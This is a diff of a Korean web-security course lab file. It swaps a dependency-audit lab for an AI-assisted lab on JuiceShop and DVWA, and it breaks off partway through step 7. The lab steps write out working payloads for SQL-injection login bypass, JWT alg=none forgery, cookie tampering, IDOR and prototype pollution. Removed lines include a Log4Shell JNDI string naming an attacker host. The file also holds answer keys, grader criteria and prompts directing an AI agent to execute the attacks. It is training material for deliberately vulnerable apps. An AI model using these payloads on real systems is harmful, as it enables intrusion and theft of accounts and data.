@@ -1,265 +1,618 @@
-lab_id: standalone-web-vuln-week09
-title: A06 Vulnerable Components — npm audit + retire.js + dependency 분석
-version: standalone-non-ai
-course: web-vuln
+lab_id: web-vuln-ai-week09
+title: Insecure Deserialization 실습 (AI 지원)
+version: ai
+course: web-vuln-ai
 week: 9
-description: |
-  OWASP A06 — *외부 라이브러리* 의 *알려진 vuln 사용*. JuiceShop (Node.js) 의
-  npm audit + retire.js + dependency tree 분석. CVE matching.
+description: 안전하지 않은 역직렬화 취약점을 통한 JWT 변조, Prototype Pollution, 쿠키 객체 조작을 JuiceShop과
+  DVWA에서 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: medium
-duration_minutes: 150
-
+duration_minutes: 120
+objectives:
+- 직렬화/역직렬화의 원리와 보안 위험을 이해한다
+- JWT 토큰 조작과 알고리즘 변조를 실습한다
+- Prototype Pollution과 쿠키 기반 객체 조작을 학습한다
+pass_threshold: 0.6
 steps:
+- order: 1
+  instruction: 'JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회하고 JWT 토큰을 획득하시오.
 
-  - order: 1
-    instruction: |
-      ## 🎯 MISSION — JuiceShop (Node.js) 의 dependency 분석 시도
 
-      JuiceShop 의 *package.json* 노출 가능 성 + dependency tree 추정.
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `recon` 에 적합한 도구: whatweb, nmap -sV, nikto, wafw00f.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: POST /rest/user/login 에 email 필드에 ' or 1=1-- 을 넣고 password는 아무 값을 넣으세요.
+  category: recon
+  points: 8
+  answer: "\U0001F916 프롬프트: JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회하고 JWT 토큰을\
+    \ 획득해줘\n\U0001F4CE 참고 (CLI): curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login\
+    \ \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"' or\
+    \ 1=1--\",\"password\":\"anything\"}'"
+  answer_detail: JuiceShop의 로그인 API는 SQLite를 사용하며, SQL Injection으로 인증을 우회할 수 있습니다.
+    성공하면 JWT 토큰(authentication.token)이 반환되며, 이 토큰의 직렬화된 페이로드를 역직렬화 공격에 활용합니다.
+  verify:
+    type: output_contains
+    expect: token
+    field: stdout
+    semantic:
+      intent: JuiceShop 관리자 인증 SQL Injection 로 우회해 JWT 토큰 획득 — OR 1=1-- 또는 admin@juice-sh.op
+        apostrophe
+      success_criteria:
+      - 로그인 API POST 에 SQLi 페이로드 주입 시도
+      - 응답의 JWT authentication.token 또는 Authorization 헤더 추출
+      - 획득 토큰을 후속 요청에 사용
+      acceptable_methods:
+      - curl POST /rest/user/login + payload
+      - Burp Repeater
+      - sqlmap --data --technique=B
+      - JuiceShop CTF official walkthrough
+      negative_signs:
+      - 일반 로그인만
+      - JWT 추출 없음
+      - 재사용 없음
+  target_vm: attacker
+  script: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n \
+    \    -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"' or 1=1--\"\
+    ,\"password\":\"anything\"}'"
+  risk_level: low
+  bastion_prompt: 'JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회하고 JWT 토큰을 획득해줘
 
-      ## 💻 실행 명령
 
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      echo "=== JuiceShop /package.json 노출 ==="
-      curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' \
-        http://10.20.30.1/package.json
-      echo ""
-      curl -s -H 'Host: juice.6v6.lab' http://10.20.30.1/package.json 2>&1 | head -20
 
-      echo ""
-      echo "=== /package-lock.json 노출 ==="
-      curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' \
-        http://10.20.30.1/package-lock.json
-      SH
-      ```
 
-      ## 📋 확인 사항
-      - package.json 의 *공개 응답* (200 = info leak / 404 = 정상)
-      - dependency list 추출 가능 여부
-    hint: package.json / package-lock.json 노출
-    category: survey
-    points: 25
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' http://10.20.30.1/package.json
-      curl -s -H 'Host: juice.6v6.lab' http://10.20.30.1/package.json 2>&1 | head -20
-      SH
-    answer_detail: package.json 노출 audit
-    verify:
-      type: output_contains
-      expect: '404\|200'
-      field: stdout
-      semantic:
-        intent: dependency 분석
-        success_criteria: [package.json audit]
-        acceptable_methods:
-          - "**[OSS] curl + package.json**"
-          - "**[OSS] retire.js scanner**"
-          - "**[OSS] npm audit (실 access 시)**"
-          - "**[OSS] CWE-1104 Use of Unmaintained Third Party Components**"
-    target_vm: attacker
+    [도구 권장] recon: whatweb, nmap -sV, nikto, wafw00f. curl 만 쓰지 말고 **whatweb** 등 적합
+    도구로 호출 후 stdout quote.
 
-  - order: 2
-    instruction: |
-      ## 🎯 MISSION — Log4Shell + Spring4Shell + xz-utils 사례 학습
 
-      *역대 최대 dependency vuln* 3 사례 분석.
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+- order: 2
+  instruction: '획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자 정보)를
+    확인하라.
 
-      ## 사례 1 — Log4Shell (CVE-2021-44228, 2021-12)
-      - Log4j 2.0-2.14 의 JNDI lookup
-      - payload: `${jndi:ldap://attacker.com/x}`
-      - 영향: *모든 Java app* (Apache / Solr / ElasticSearch)
-      - CVSS: 10.0 (Critical)
 
-      ## 사례 2 — Spring4Shell (CVE-2022-22965, 2022-03)
-      - Spring Framework 5.x 의 RCE
-      - 영향: Spring MVC app
-      - CVSS: 9.8
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `recon` 에 적합한 도구: whatweb, nmap -sV, nikto, wafw00f.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: JWT는 header.payload.signature 형태입니다. echo 'JWT_PART' | base64 -d 로 각 부분을 디코딩하세요.
+  category: recon
+  points: 10
+  answer: '🤖 프롬프트: 획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자
+    정보)를 확인해줘
 
-      ## 사례 3 — xz-utils backdoor (CVE-2024-3094, 2024-03)
-      - Jia Tan 의 *2년 사회공학* → xz-utils 5.6.0-5.6.1 의 backdoor
-      - sshd 의 *pre-auth RCE 직전* 발견
-      - 영향: Debian / Fedora 의 *모든 sshd* (단 다행히 unstable 만)
-      - CVSS: 10.0
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
+    ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}''
+    | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo ''=== JWT Header ===''
+    && echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null && echo '''' && echo ''===
+    JWT Payload ==='' && echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null'
+  answer_detail: JWT 페이로드에는 사용자 ID, 이메일, 역할(role) 등의 정보가 JSON 형태로 직렬화되어 있습니다. Header의
+    alg 필드가 HS256이면 HMAC 서명, RS256이면 RSA 서명입니다. 서명 알고리즘이 none이거나 약한 키를 사용하면 페이로드를
+    변조할 수 있습니다.
+  verify:
+    type: output_contains
+    expect: JWT Header
+    field: stdout
+    semantic:
+      intent: JWT 구조 분석 — 3부 Base64URL 디코드 후 Header(alg)·Payload(sub/iat/exp) 확인
+      success_criteria:
+      - JWT 를 점(.)으로 분리해 Base64 디코드
+      - Header alg + Payload 사용자 정보 해석
+      - 서명부는 HMAC 임을 명시
+      acceptable_methods:
+      - echo <jwt> | cut -d. -f1 | base64 -d
+      - python PyJWT decode options={verify_signature:false}
+      - jwt.io 페이스트
+      - jwt_tool --decode
+      negative_signs:
+      - 디코드 없이 토큰만
+      - Header/Payload 해석 없음
+      - 서명부 언급 없음
+  target_vm: attacker
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
+    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
+    | cut -d''"'' -f4) && echo ''=== JWT Header ==='' && echo $TOKEN | cut -d. -f1
+    | base64 -d 2>/dev/null && echo '''' && echo ''=== JWT Payload ==='' && echo $TOKEN
+    | cut -d. -f2 | base64 -d 2>/dev/null'
+  risk_level: low
+  bastion_prompt: '획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자
+    정보)를 확인해줘
 
-      ## 학습 산출물
-      각 사례 의 *5 항목*: 발견 / payload / 영향 / CVSS / 정정.
-    hint: 3 사례 의 5 항목 학습
-    category: analysis
-    points: 25
-    answer: |
-      cat <<'EOF'
-      Log4Shell: JNDI lookup ${jndi:ldap://...} + 모든 Java app + 10.0
-      Spring4Shell: Spring MVC RCE + 9.8
-      xz-utils: Jia Tan 2년 + sshd pre-auth + 10.0
-      EOF
-    answer_detail: 3 dependency vuln 사례
-    verify:
-      type: output_contains
-      expect: 'Log4Shell\|jndi\|xz'
-      field: stdout
-      semantic:
-        intent: dependency 사례
-        success_criteria: [3 사례 + 5 항목]
-        acceptable_methods:
-          - "**[OSS] Log4Shell + Spring4Shell + xz-utils**"
-          - "**[OSS] CVE matching tool**"
-          - "**[OSS] dependency 의 *수기* audit**"
-    target_vm: bastion
 
-  - order: 3
-    instruction: |
-      ## 🎯 MISSION — SCA (Software Composition Analysis) 도구 매트릭스
 
-      modern dependency audit 의 *5 도구* 매핑.
 
-      ## 도구 비교
-      | 도구 | 언어 | 특징 |
-      |------|------|------|
-      | npm audit | Node.js | npm 의 *내장* |
-      | yarn audit | Node.js | yarn 의 *내장* |
-      | pip-audit | Python | PyPI 의 vuln |
-      | Snyk | 다언어 | 상용 + free tier |
-      | Dependabot | GitHub | 자동 PR |
-      | retire.js | JavaScript (client) | 브라우저 의 *오래된 lib* |
-      | OWASP Dependency-Check | Java | NVD 기반 |
-    hint: SCA 도구 5 종
-    category: analysis
-    points: 25
-    answer: |
-      cat <<'EOF'
-      npm audit / yarn audit (Node)
-      pip-audit (Python)
-      Snyk / Dependabot (다언어)
-      retire.js (client JS)
-      OWASP Dependency-Check (Java)
-      EOF
-    answer_detail: SCA 도구 매트릭스
-    verify:
-      type: output_contains
-      expect: 'npm\|Snyk\|retire'
-      field: stdout
-      semantic:
-        intent: SCA 도구
-        success_criteria: [5 도구]
-        acceptable_methods:
-          - "**[OSS] npm audit fix --force**"
-          - "**[OSS] Snyk monitor**"
-          - "**[OSS] Dependabot 자동 PR**"
-          - "**[OSS] SBOM (CycloneDX / SPDX)**"
-    target_vm: bastion
+    [도구 권장] recon: whatweb, nmap -sV, nikto, wafw00f. curl 만 쓰지 말고 **whatweb** 등 적합
+    도구로 호출 후 stdout quote.
 
-  - order: 4
-    instruction: |
-      ## 🎯 MISSION — W09 보고서 + 매핑
 
-      ## 산출물
-      ```markdown
-      # W09 — A06 Vulnerable Components
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+- order: 3
+  instruction: 'JWT 토큰의 알고리즘을 none으로 변경하여 서명 검증 우회를 시도하시오. 페이로드의 id를 다른 사용자로 변경한 위조
+    토큰을 생성하라.
 
-      ## 1. JuiceShop dependency audit 결과
-      ## 2. 3 사례 (Log4Shell / Spring4Shell / xz-utils)
-      ## 3. SCA 5 도구 추천
-      ## 4. CVE matching workflow
 
-      ## 매핑
-      | F | CVSS | CWE |
-      | F1 dependency 미audit | 7.5 (H) | CWE-1104 |
-      ```
-    hint: 4 섹션 + CWE-1104
-    category: synthesis
-    points: 25
-    answer: 위 형식
-    answer_detail: W09 보고서
-    verify:
-      type: output_contains
-      expect: 'CWE-1104\|dependency'
-      field: stdout
-      semantic:
-        intent: W09 종합
-        success_criteria: [4 섹션]
-        acceptable_methods: ["**[관리적] PTES + SCA + SBOM**"]
-    target_vm: bastion
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `exploit` 에 적합한 도구: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf
+    등). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 헤더를 {"alg":"none","typ":"JWT"}로 변경하고, 페이로드에서 id를 2로 수정 후 Base64URL 인코딩하세요.
+    서명 부분은 비워둡니다(header.payload. 형태).
+  category: exploit
+  points: 12
+  answer: '🤖 프롬프트: JWT 토큰의 알고리즘을 none으로 변경하여 서명 검증 우회를 시도해줘
 
-  # ============================================================
-  # STEP 5 — R/B/P 종합 (Vulnerable Components)
-  # ============================================================
-  - order: 5
-    instruction: |
-      ## 🎯 MISSION (R/B/P 종합)
+    📎 참고 (CLI): HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0 | tr
+    ''+/'' ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"status":"success","data":{"id":2,"email":"user@juice-sh.op","role":"customer"}}''
+    | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && FORGED="${HEADER}.${PAYLOAD}."
+    && echo "Forged JWT: ${FORGED:0:60}..." && curl -s http://10.20.30.80:3000/rest/basket/2
+    -H "Authorization: Bearer $FORGED" -w ''\nHTTP:%{http_code}'''
+  answer_detail: 'Algorithm None 공격은 JWT의 alg 필드를 none으로 설정하여 서명 검증을 건너뛰게 합니다. 서버가
+    alg 값을 신뢰하면 서명 없이도 변조된 토큰을 수용합니다. 방어: 서버에서 알고리즘을 고정하고 none을 명시적으로 거부해야 합니다.'
+  verify:
+    type: output_contains
+    expect:
+    - Forged JWT
+    - none
+    field: stdout
+    semantic:
+      intent: JWT alg none 변조 — Header.alg=none + 서명부 제거 후 Payload 의 id 변경해 타 사용자
+        위조 토큰 생성
+      success_criteria:
+      - Header alg none 으로 변경한 토큰 재인코딩
+      - Payload 의 id 또는 email 타 사용자로 수정
+      - 위조 토큰으로 Authorization 헤더 포함 요청해 권한 이관 확인
+      acceptable_methods:
+      - jwt_tool -X a none
+      - python PyJWT encode alg=none
+      - Burp JWT Editor extension
+      - base64 수동 재인코딩
+      negative_signs:
+      - alg 변조 없이 payload 만
+      - 위조 후 서버 검증 없음
+      - id 변경 없음
+  target_vm: attacker
+  script: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0 | tr ''+/''
+    ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"status":"success","data":{"id":2,"email":"user@juice-sh.op","role":"customer"}}''
+    | base64 -w0 | tr ''+/'' ''-_'' | tr -d ''='') && FORGED="${HEADER}.${PAYLOAD}."
+    && echo "Forged JWT: ${FORGED:0:60}..." && curl -s http://10.20.30.80:3000/rest/basket/2
+    -H "Authorization: Bearer $FORGED" -w ''\nHTTP:%{http_code}'''
+  risk_level: medium
+  bastion_prompt: 'JWT 토큰의 알고리즘을 none으로 변경하여 서명 검증 우회를 시도해줘
 
-      Red = Log4Shell payload 시도 / Blue = SCA scan + WAF custom rule / Purple =
-      patch automation routine.
 
-      ## 📖 시나리오 상세
 
-      ### 🔴 Red Team — 0-Day Log4Shell-class 의 자동 exploit
 
-      **페르소나**: APT 또는 mass scanner (Shodan 의 자동 scanning) — Log4Shell 같은
-      0-Day 의 패치 전 의 mass exploitation. 2021-12 의 실제 사례 의 재현.
+    [도구 권장] exploit: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등). curl 만 쓰지 말고
+    **공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등)** 등 적합 도구로 호출 후 stdout quote.
 
-      **공격 의도**:
-      1. **JNDI lookup 의 trigger** = User-Agent header 의 `${jndi:ldap://attacker/x}`
-         = Log4j 의 자동 lookup → RCE
-      2. **0-Day 의 특징** = signature 없음 = WAF 의 표준 룰 의 매치 X = 위험
-      3. **mass scanning** = 100+ vhost 의 자동 페이로드 → 1 hit = 즉시 침투
 
-      **공격 단계**:
-      - R1: curl 의 User-Agent 의 JNDI payload = Apache log 의 기록
-      - R2: ModSec audit log 의 매치 X 확인 = signature 부재
-      - R3: (개념) attacker LDAP server 의 callback = 침투 성공
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+- order: 4
+  instruction: 'DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와 security 쿠키를
+    확인하라.
 
-      ### 🔵 Blue Team — SCA + WAF custom rule + NVD sync
 
-      **탐지 source**:
-      - SCA (Trivy/Grype/Snyk) 의 dependency 의 known CVE 매치
-      - NVD JSON feed 의 자동 sync (cron 매 15분)
-      - WAF custom rule (community 의 30분 내 의 즉시 배포)
-      - SBOM 의 매 build 의 영구 기록
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `recon` 에 적합한 도구: whatweb, nmap -sV, nikto, wafw00f.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: curl -v -d 'username=admin&password=password&Login=Login' http://{{WEB_IP}}:8080/login.php
+    로 응답 헤더의 Set-Cookie를 확인하세요.
+  category: recon
+  points: 8
+  answer: "\U0001F916 프롬프트: DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와\
+    \ security 쿠키를 확인해줘\n\U0001F4CE 참고 (CLI): curl -s -c /tmp/dvwa_deser.txt \\\n\
+    \  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
+    \ -L -D - \\\n | grep -i 'set-cookie' && echo '=== Cookie File ===' && cat /tmp/dvwa_deser.txt"
+  answer_detail: PHP의 세션은 서버 측에 저장되지만, security 쿠키는 클라이언트에 평문으로 저장됩니다. 클라이언트에서 쿠키
+    값을 변조하면 서버가 검증 없이 사용하여 보안 레벨이 변경됩니다. 이것이 신뢰할 수 없는 데이터의 역직렬화 문제입니다.
+  verify:
+    type: output_contains
+    expect: Set-Cookie
+    field: stdout
+    semantic:
+      intent: DVWA 쿠키 분석 — PHPSESSID + security 쿠키 확인 (low/medium/high/impossible
+        레벨)
+      success_criteria:
+      - DVWA 로그인 후 Set-Cookie 헤더 수집
+      - PHPSESSID 값과 security 쿠키 값 분석
+      - security 쿠키가 보호 수준을 제어함 설명
+      acceptable_methods:
+      - curl -c cookies.txt -X POST -d ... <login>
+      - browser dev tools Application > Cookies
+      - Burp Proxy 로 쿠키 기록
+      - python requests session
+      negative_signs:
+      - 쿠키 수집 없음
+      - security 쿠키 역할 설명 없음
+      - level 변경 가능성 언급 없음
+  target_vm: attacker
+  script: "curl -s -c /tmp/dvwa_deser.txt \\\n  -d 'username=admin&password=password&Login=Login'\
+    \ http://10.20.30.80:8080/login.php -L -D - \\\n | grep -i 'set-cookie' && echo\
+    \ '=== Cookie File ===' && cat /tmp/dvwa_deser.txt"
+  risk_level: low
+  bastion_prompt: 'DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와 security
+    쿠키를 확인해줘
 
-      **대응**:
-      - B1: 0-Day 공개 = NVD sync 의 즉시 alert
-      - B2: WAF custom rule 의 즉시 배포 (community 의 30분)
-      - B3: 영향 자산 의 patch (target MTTP = 24h)
-      - B4: SBOM 의 영구 기록 + 다음 사건 의 base
 
-      ### 🟣 Purple Team — patch automation + MTTP 측정
 
-      **분석**:
-      - MTTP (Mean Time To Patch) 의 routine 측정 = 24h 목표
-      - 0-Day 의 detect → patch 의 cycle = WAF custom rule (즉시) → SCA scan (1시간)
-        → patch deploy (24h)
 
-      **개선 cycle**:
-      1. NVD sync 의 cron 자동화 (매 15분)
-      2. CI 통합 의 SCA scan (PR 시 의 의무)
-      3. SBOM 의 의무 화 (모든 build) + CycloneDX/SPDX
-      4. 분기 1회 의 unmaintained lib 의 review
+    [도구 권장] recon: whatweb, nmap -sV, nikto, wafw00f. curl 만 쓰지 말고 **whatweb** 등 적합
+    도구로 호출 후 stdout quote.
 
-      ## 💻 실행
-      ```bash
-      ssh 6v6-attacker 'curl -s -o /dev/null -w "Log4Shell %{http_code}\n" -H "Host: juice.6v6.lab" -H "User-Agent: \${jndi:ldap://attacker/x}" http://10.20.30.1/'
-      ssh 6v6-web "sudo tail -10 /var/log/apache2/modsec_audit.log 2>/dev/null | grep -i 'jndi' | head -3 || echo 'jndi 매치 없음 (custom rule 필요)'"
-      echo "Coverage: 0-day = signature 없음 → WAF custom rule (community 30분) + SCA 의 NVD sync"
-      ```
 
-      ## 💡 왜
-      0-day 의 WAF 즉시 룰 의 가치 + SBOM 의무화 의 routine.
-    hint: 'curl 의 jndi UA + audit log 확인'
-    category: rbp_integration
-    points: 4
-    answer: |
-      ssh 6v6-attacker 'curl -s -o /dev/null -w "Log4Shell %{http_code}\n" -H "Host: juice.6v6.lab" -H "User-Agent: \${jndi:ldap://attacker/x}" http://10.20.30.1/'
-      ssh 6v6-web "sudo tail -10 /var/log/apache2/modsec_audit.log 2>/dev/null | grep -i 'jndi' | head -3 || echo 'jndi 매치 없음 (custom rule 필요)'"
-      echo "Coverage: 0-day WAF custom rule + SCA NVD sync"
-    answer_detail: Log4Shell R/B/P 1 cycle
-    verify:
-      type: output_contains
-      expect: 'Coverage'
-      field: stdout
-      semantic:
-        intent: Log4Shell R/B/P 1 cycle
-        success_criteria: [jndi UA, audit log, Coverage]
-        acceptable_methods: ["**[OSS] curl jndi + audit log grep**"]
-    target_vm: attacker
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+- order: 5
+  instruction: '쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로 변경하여
+    SQL Injection이 가능한 상태로 만들어라.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `exploit` 에 적합한 도구: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf
+    등). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: curl -b 'PHPSESSID=세션값;security=low' 형태로 쿠키를 직접 지정하세요.
+  category: exploit
+  points: 10
+  answer: '🤖 프롬프트: 쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로
+    변경하여 SQL Injection이 가능한 상태로 만들어라해줘
+
+    📎 참고 (CLI): SESSID=$(grep PHPSESSID /tmp/dvwa_deser.txt | awk ''{print $NF}'')
+    && echo ''=== impossible 레벨 ==='' && curl -s -b "PHPSESSID=$SESSID;security=impossible"
+    ''http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit'' -o /dev/null
+    -w ''HTTP:%{http_code}'' && echo '''' && echo ''=== low 레벨 (변조) ==='' && curl
+    -s -b "PHPSESSID=$SESSID;security=low" "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1''+OR+''1''=''1&Submit=Submit"
+    | grep -o ''First name:[^<]*'' | head -3'
+  answer_detail: DVWA는 보안 레벨을 클라이언트 쿠키로 관리합니다. 클라이언트 측에서 쿠키 값을 변조하면 서버의 보안 설정을 우회할
+    수 있습니다. 이는 신뢰할 수 없는 데이터(쿠키)를 검증 없이 사용하는 대표적인 역직렬화 취약 패턴입니다.
+  verify:
+    type: output_contains
+    expect:
+    - First name
+    - low
+    field: stdout
+    semantic:
+      intent: DVWA security 쿠키 변조 — impossible에서 low 로 변경 후 SQLi 실행 가능해짐을 검증
+      success_criteria:
+      - 쿠키 security=impossible 을 security=low 로 변경
+      - 변경 후 요청에서 SQLi payload 동작 확인
+      - 클라이언트 쿠키로 보안 레벨 제어하는 잘못된 설계 지적
+      acceptable_methods:
+      - curl -b security=low -b PHPSESSID=<...> <vuln_url>
+      - Burp Repeater 로 쿠키 수정
+      - browser cookie editor extension
+      - python requests cookies={...}
+      negative_signs:
+      - 쿠키 변경 없이 payload 만
+      - SQLi 재실행 검증 없음
+      - 설계 결함 언급 없음
+  target_vm: attacker
+  script: SESSID=$(grep PHPSESSID /tmp/dvwa_deser.txt | awk '{print $NF}') && echo
+    '=== impossible 레벨 ===' && curl -s -b "PHPSESSID=$SESSID;security=impossible"
+    'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' -o /dev/null
+    -w 'HTTP:%{http_code}' && echo '' && echo '=== low 레벨 (변조) ===' && curl -s -b
+    "PHPSESSID=$SESSID;security=low" "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"
+    | grep -o 'First name:[^<]*' | head -3
+  risk_level: medium
+  bastion_prompt: '쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로
+    변경하여 SQL Injection이 가능한 상태로 만들어라해줘
+
+
+
+
+    [도구 권장] exploit: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등). curl 만 쓰지 말고
+    **공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등)** 등 적합 도구로 호출 후 stdout quote.
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+- order: 6
+  instruction: 'JuiceShop의 장바구니 API에서 BOLA/IDOR을 이용한 객체 참조 변조를 수행하시오. 다른 사용자의 장바구니(basket/1,
+    basket/2)에 접근하라.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `exploit` 에 적합한 도구: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf
+    등). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 인증 토큰과 함께 /rest/basket/1, /rest/basket/2에 순차적으로 접근하여 다른 사용자 데이터를 조회하세요.
+  category: exploit
+  points: 12
+  answer: '🤖 프롬프트: JuiceShop의 장바구니 API에서 BOLA/IDOR을 이용한 객체 참조 변조를 수행해줘
+
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
+    ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}''
+    | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo ''=== Basket 1 ===''
+    && curl -s http://10.20.30.80:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN"
+    | head -c 300 && echo '''' && echo ''=== Basket 2 ==='' && curl -s http://10.20.30.80:3000/rest/basket/2
+    -H "Authorization: Bearer $TOKEN" | head -c 300'
+  answer_detail: 직렬화된 객체의 ID 값을 변경하면 서버가 권한 확인 없이 요청된 리소스를 반환합니다. basket/1에서 basket/2로
+    변경하는 것은 직렬화된 참조를 조작하는 것과 같습니다. 서버는 반드시 요청자가 해당 객체에 접근할 권한이 있는지 검증해야 합니다.
+  verify:
+    type: output_contains
+    expect: Basket
+    field: stdout
+    semantic:
+      intent: BOLA/IDOR — /basket/<id> 경로의 id 를 1/2/3 으로 순차 변경해 타 사용자 장바구니 조회
+      success_criteria:
+      - basket 또는 유사 리소스의 id 변경 반복 요청
+      - 타 사용자 데이터 조회 응답 확인
+      - 인가 검증 누락(서버가 소유권 확인 안함) 판정
+      acceptable_methods:
+      - for id in 1 2 3; do curl -H Auth... <url>/rest/basket/$id; done
+      - Burp Intruder 로 id 페이로드
+      - ffuf -w ids.txt
+      - autorize extension
+      negative_signs:
+      - 본인 id 만 조회
+      - 응답 분석 없음
+      - 인가 검증 개념 누락
+  target_vm: attacker
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
+    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
+    | cut -d''"'' -f4) && echo ''=== Basket 1 ==='' && curl -s http://10.20.30.80:3000/rest/basket/1
+    -H "Authorization: Bearer $TOKEN" | head -c 300 && echo '''' && echo ''=== Basket
+    2 ==='' && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer
+    $TOKEN" | head -c 300'
+  risk_level: medium
+  bastion_prompt: 'JuiceShop의 장바구니 API에서 BOLA/IDOR을 이용한 객체 참조 변조를 수행해줘
+
+
+
+
+    [도구 권장] exploit: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등). curl 만 쓰지 말고
+    **공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등)** 등 적합 도구로 호출 후 stdout quote.
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+- order: 7
+  instruction: 'Prototype Pollution 공격을 시도하시오. JuiceShop API에 __proto__ 속성을 포함한 JSON을
+    전송하여 서버 객체를 오염시켜라.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `exploit` 에 적합한 도구: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf
+    등). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: POST /api/Users/ 에 {"email":"proto@test.com","password":"test1234","__proto__":{"role":"admin","isAdmin":true}}
+    형태로 전송하세요.
+  category: exploit
+  points: 12
